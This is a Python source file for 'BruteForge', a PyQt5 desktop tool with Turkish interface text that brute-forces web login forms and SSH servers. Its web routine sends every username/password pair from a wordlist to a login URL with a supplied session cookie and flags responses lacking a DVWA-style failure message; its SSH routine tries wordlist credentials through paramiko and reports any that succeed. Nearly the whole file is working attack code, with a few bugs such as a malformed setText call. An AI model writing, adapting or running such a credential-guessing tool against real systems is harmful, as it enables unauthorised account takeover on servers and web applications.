################################################
################################################
################################################
#########*******###*******####**********########
########**#####**#**#####**###**######**########
########**#####**#**#####**###**######**########
########**#####**#**#####**###**********########
########**#####**#**#####**###**################
########**#####**#**#####**###**################
########**######***######**###**################
########**###############**###**################
########**###############**###**################
################################################
########Copyright © Maresal Programming#########
################################################    

from PyQt5 import QtWidgets
from PyQt5 import QtCore
import sys
import os
from BruteForge import Ui_MainWindow as BF
import requests
import paramiko
import time
import passwd
import socket

class bruteForgeX(QtWidgets.QMainWindow):
    def __init__(self):
        super(bruteForgeX,self).__init__()
        self.bfx = BF()
        self.bfx.setupUi(self)
        self.show()

        self.bfx.pushButton.clicked.connect(self.WebBF)
        self.bfx.pushButton_2.clicked.connect(self.SSHBF)
        self.bfx.pushButton_9.clicked.connect(self.WBFSetting)
        self.bfx.pushButton_11.clicked.connect(self.startWebBF)
        self.bfx.pushButton_5.clicked.connect(self.SSHSetting)
        self.bfx.pushButton_4.clicked.connect(self.startSSHF)
        self.bfx.pushButton_10.clicked.connect(self.openWEB)
        self.bfx.pushButton_3.clicked.connect(self.openSSH)
        self.bfx.btnclr.clicked.connect(self.clearAll)


    def WebBF(self):
        if self.bfx.groupBox_2.isHidden() == True:
            self.bfx.groupBox.setHidden(True)
            self.bfx.groupBox_2.setHidden(False)        
        else:
            self.bfx.groupBox_2.setHidden(True)
            self.bfx.groupBox.setHidden(True)

    def openWEB(self):
        a = QtWidgets.QFileDialog.getOpenFileName()
        self.bfx.lineEdit_6.setText(a[0])

    def SSHBF(self):
        if self.bfx.groupBox.isHidden() == True:
            self.bfx.groupBox.setHidden(False)
            self.bfx.groupBox_2.setHidden(True)
        else :
            self.bfx.groupBox.setHidden(True)
            self.bfx.groupBox_2.setHidden(True)
    
    def openSSH(self):
        a = QtWidgets.QFileDialog.getOpenFileName()
        self.bfx.lineEdit.setText(a[0])

    def clearAll(self):
        #WEB Kısmı
        self.bfx.pushButton_10.setHidden(False)
        self.bfx.lineEdit_6.setHidden(False)
        self.bfx.lineEdit_6.clear()
        self.bfx.pushButton_9.setHidden(False)
        self.bfx.pushButton_11.setHidden(True)
        self.bfx.textBrowser_3.setHidden(True)
        self.bfx.textBrowser_3.clear()
        self.bfx.lineEdit_5.setReadOnly(False)
        self.bfx.lineEdit_5.setEnabled(True)
        self.bfx.lineEdit_5.clear()
        self.bfx.lineEdit_7.setReadOnly(False)
        self.bfx.lineEdit_7.setEnabled(True)  
        self.bfx.lineEdit_7.clear()
        #SSH Kısmı
        self.bfx.pushButton_3.setHidden(False)
        self.bfx.lineEdit.setHidden(False)
        self.bfx.lineEdit.clear()
        self.bfx.pushButton_5.setHidden(False)
        self.bfx.pushButton_4.setHidden(True)
        self.bfx.textBrowser.setHidden(True)
        self.bfx.textBrowser.clear()
        self.bfx.lineEdit_2.setReadOnly(False)
        self.bfx.lineEdit_2.setEnabled(True)
        self.bfx.lineEdit_2.clear()

    def WBFSetting(self):
        cb = self.bfx.lineEdit_5.text()
        url = self.bfx.lineEdit_7.text()
        if cb == '' and url == '':
            QtWidgets.QMessageBox.information(self,'Uyarı!','Lütfen Tüm Bilgileri Doldurunuz.')
        else :
            uN = self.bfx.lineEdit_6.text()
            if uN == '':
                a = os.path.realpath('passwd.py')
                self.bfx.lineEdit_6.setText(a)
                self.bfx.pushButton_10.setHidden(True)
                self.bfx.lineEdit_6.setHidden(True)
                self.bfx.pushButton_9.setHidden(True)
                self.bfx.pushButton_11.setHidden(False)
                self.bfx.textBrowser_3.setHidden(False)
                self.bfx.lineEdit_5.setReadOnly(True)
                self.bfx.lineEdit_5.setEnabled(False)
                self.bfx.lineEdit_7.setReadOnly(True)
                self.bfx.lineEdit_7.setEnabled(False)
            else :
                self.bfx.pushButton_10.setHidden(True)
                self.bfx.lineEdit_6.setHidden(True)
                self.bfx.pushButton_9.setHidden(True)
                self.bfx.pushButton_11.setHidden(False)
                self.bfx.textBrowser_3.setHidden(False)
                self.bfx.lineEdit_5.setReadOnly(True)
                self.bfx.lineEdit_5.setEnabled(False)
                self.bfx.lineEdit_7.setReadOnly(True)
                self.bfx.lineEdit_7.setEnabled(False)

    def startWebBF(self):
        try:
            cookie = self.bfx.lineEdit_5.text()
            b = cookie.strip()
            print(b)
            # Password Dosyası Kontrolü
            ps = self.bfx.lineEdit_6.text()
            xc = ps.split('\\')
            # Url Bilgisi
            url = self.bfx.lineEdit_7.text()
            urx = url.split('&')
            print(urx)
            print(cookie)

            
            header = {'Cookie':b}
            print(header)
            if xc[-1] == 'passwd.py':
                for i in passwd.username_list:
                    for j in passwd.password_list:
                        url=f"{urx[0]}{str(i)}&{urx[1]}{str(j)}&Login=Login"
                        sonuc = requests.get(url=url,headers=header)
                        print(sonuc)
                        sn = sonuc.status_code
                        c = self.bfx.textBrowser_3.toPlainText()
                        z = (f'\nUsername: {i} \nPassword: {j} \nstatus code: {sn}\nUzunluk :{len(sonuc.content)}')
                        ser = c = c + z
                        self.bfx.textBrowser_3.setText(ser)
                        if not 'Username and/or password incorrect.' in str(sonuc.content):
                            xx = ser +'\nKullanıcı adı ve parola doğru'
                            self.bfx.textBrowser_3.setText(xx)
            else :
                xx = self.bfx.lineEdit_6.text()
                with open(f'{xx}','r') as file :
                    cc = file.readlines()
                for i in cc:
                    for j in cc:
                        url=f"{urx[0]}{str(i)}&{urx[1]}{str(j)}&Login=Login"
                        sonuc = requests.get(url=url,headers=header)
                        print(sonuc)
                        sn = sonuc.status_code
                        c = self.bfx.textBrowser_3.toPlainText()
                        b = (f'\nUsername: {i} \nPassword: {j} \nstatus code: {sn}\nUzunluk :{len(sonuc.content)}')
                        ser = c = c + b
                        self.bfx.textBrowser_3.setText(ser)
                        if not 'Username and/or password incorrect.' in str(sonuc.content):
                            xx = ser +'\nKullanıcı adı ve parola doğru'
                            self.bfx.textBrowser_3.setText(xx)

        except Exception as err :
            self.bfx.textBrowser_3.setText(str(err))
    
    def SSHSetting(self):
        host = self.bfx.lineEdit_2.text()
        if host == '':
            QtWidgets.QMessageBox.information(self,'Uyarı!','Host Bilgisi Boş Olamaz.')
        else :
            uN = self.bfx.lineEdit.text()
            if uN == '':
                a = os.path.realpath('passwd.py')
                self.bfx.lineEdit.setText(a)
                self.bfx.pushButton_3.setHidden(True)
                self.bfx.lineEdit.setHidden(True)
                self.bfx.pushButton_5.setHidden(True)
                self.bfx.pushButton_4.setHidden(False)
                self.bfx.textBrowser.setHidden(False)
                self.bfx.lineEdit_2.setReadOnly(True)
                self.bfx.lineEdit_2.setEnabled(False)
            else :
                self.bfx.pushButton_3.setHidden(True)
                self.bfx.lineEdit.setHidden(True)
                self.bfx.pushButton_5.setHidden(True)
                self.bfx.pushButton_4.setHidden(False)
                self.bfx.textBrowser.setHidden(False)
                self.bfx.lineEdit_2.setReadOnly(True)
                self.bfx.lineEdit_2.setEnabled(False)

    def startSSHF(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ps = self.bfx.lineEdit.text()
        xc = ps.split('\\')
        print(xc)

        host = self.bfx.lineEdit_2.text()
        if xc[-1] == 'passwd.py':
            for i in passwd.username_list:
                for j in passwd.password_list:
                    try:
                        client.connect(host,username=i,password=j,timeout=3,auth_timeout=10,banner_timeout=20)
                    except socket.timeout:
                        return False
                    except paramiko.AuthenticationException:
                        a = self.bfx.textBrowser.toPlainText()
                        a+= f"Alınan Değer : Paralo Geçersiz {i} : {j}\n"
                        self.bfx.textBrowser.setText(a)
                        continue
                    except paramiko.SSHException:
                        a = self.bfx.textBrowser.toPlainText()
                        a+= f"Saldırı Yaptığınız Sunucu Sizi Fark Etti ve Engelledi.\n"
                        self.bfx.textBrowser.setText(a)
                        raise 
                    else:
                        a = self.bfx.textBrowser.toPlainText()
                        b = (f'Giriş Doğrulandı |✓| Username: {i} Password :{j}\n')
                        a+=b
                        self.bfx.textBrowser.setText(a)
                        client.close()
                        return True
        
        
        else :
            xx = self.bfx.lineEdit.text()
            with open(f'{xx}','r') as file :
                cc = file.readlines()
            for i in cc:
                for j in cc:
                    try:
                        client.connect(host,username=i,password=j,timeout=3,banner_timeout=100)
                        client.close()
                        self.bfx.textBrowser.setText(+f'Giriş Doğrulandı |✓| Username: {i} Password :{j}\n')
                    except paramiko.AuthenticationException as error:
                        a = self.bfx.textBrowser.toPlainText()
                        x = "Giriş Sağlanamadı.\n"
                        a+=x
                        self.bfx.textBrowser.setText(a)
                        continue
                    except paramiko.SSHException as error:
                        a = self.bfx.textBrowser.toPlainText()
                        x = "Giriş Sağlanamadı.\n"
                        a+=x
                        self.bfx.textBrowser.setText(a)
                        continue
                    except paramiko.ssh_exception.SSHException as error:
                        a = self.bfx.textBrowser.toPlainText()
                        x = "Giriş Sağlanamadı.\n"
                        a+=x
                        self.bfx.textBrowser.setText(a)     
                        continue
                    except EOFError as error :
                        print('Bağlantı Hatası')
                        continue
                    except Exception as error :
                        print(error) 



if __name__ == "__main__":
    app = QtWidgets.QApplication(sys.argv)
    main = bruteForgeX()
    app.setStyle('Fusion')
    app.exit(app.exec_())